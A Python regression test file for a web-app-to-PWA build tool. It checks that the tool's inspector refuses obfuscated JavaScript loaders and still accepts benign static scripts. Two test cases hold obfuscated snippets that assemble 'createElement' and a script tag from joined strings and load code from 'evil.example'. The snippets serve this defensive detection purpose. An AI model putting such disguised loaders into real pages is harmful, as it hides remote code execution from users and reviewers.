"""Regression for independently reported Grok Build A27 joined-loader bypass.

All cases are synthetic and use no network access. Any manual-review flag is a
safe refusal, not evidence of complete JavaScript security analysis.
"""
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / 'scripts'))
from pwa_core import inspect_input


class JoinedLoaderRegression(unittest.TestCase):
    def check_refusal(self, inline=False, js=''):
        with tempfile.TemporaryDirectory() as t:
            src = Path(t) / 'src'
            src.mkdir()
            if inline:
                html = '<!doctype html><html><head></head><body><script>' + js + '</script></body></html>'
            else:
                html = '<!doctype html><html><head></head><body><script src="app.js"></script></body></html>'
                (src / 'app.js').write_text(js, encoding='utf-8')
            idx = src / 'index.html'
            idx.write_text(html, encoding='utf-8')
            before = (idx.read_bytes(), (src / 'app.js').read_bytes() if not inline else None)
            report = inspect_input(src)
            self.assertFalse(report['static_conversion_eligible'], report)
            self.assertFalse(report['offline_complete_claim_allowed'], report)
            self.assertTrue(any('Dynamic code or DOM construction' in x for x in report['issues']), report)
            out = Path(t) / 'out'
            result = subprocess.run([sys.executable, str(ROOT / 'scripts/build_pwa.py'), str(src),
                                     '--out', str(out), '--name', 'Safe', '--short-name', 'Safe',
                                     '--strict-offline'], capture_output=True, text=True)
            self.assertEqual(result.returncode, 2, (result.stdout, result.stderr))
            self.assertFalse(out.exists(), 'A refused source must not create a public dist')
            self.assertEqual(before[0], idx.read_bytes())
            if not inline:
                self.assertEqual(before[1], (src / 'app.js').read_bytes())

    def test_joined_creator_reflect_append_external_script_refused(self):
        self.check_refusal(js=(
            "const method=['create','Element'].join('');"
            "const creator=Reflect.get(document,method);"
            "const node=creator.call(document,['scr','ipt'].join(''));"
            "node.src=['ht','tps:', '//evil.example/app.js'].join('');"
            "document.head.append(node);"
        ))

    def test_joined_creator_reflect_append_inline_script_refused(self):
        self.check_refusal(inline=True, js=(
            "let kind=['scr','ipt'].join('');"
            "let builder=Reflect.get(document,['create','Element'].join(''));"
            "let node=builder.call(document,kind);"
            "node.src=['ht','tps:', '//evil.example/a.js'].join('');"
            "document.body.append(node);"
        ))

    def test_append_only_is_conservatively_refused(self):
        self.check_refusal(js="const el=document.querySelector('#safe');document.body.append(el);")

    def test_join_only_is_conservatively_refused(self):
        self.check_refusal(js="const names=['a','b'].join('-');")

    def test_fully_static_benign_javascript_remains_eligible(self):
        with tempfile.TemporaryDirectory() as t:
            src=Path(t)
            (src / 'index.html').write_text('<html><head></head><body><script src="app.js"></script></body></html>')
            (src / 'app.js').write_text("document.body.textContent='offline demo';")
            audit=inspect_input(src)
            self.assertTrue(audit['static_conversion_eligible'],audit)
            self.assertTrue(audit['offline_complete_claim_allowed'],audit)

    def test_agent_metadata_has_no_privacy_safe_claim(self):
        meta=(ROOT/'agents/openai.yaml').read_text('utf-8').lower()
        self.assertNotIn('privacy-safe',meta)
        self.assertIn('manual security review',meta)


if __name__=='__main__':
    unittest.main()
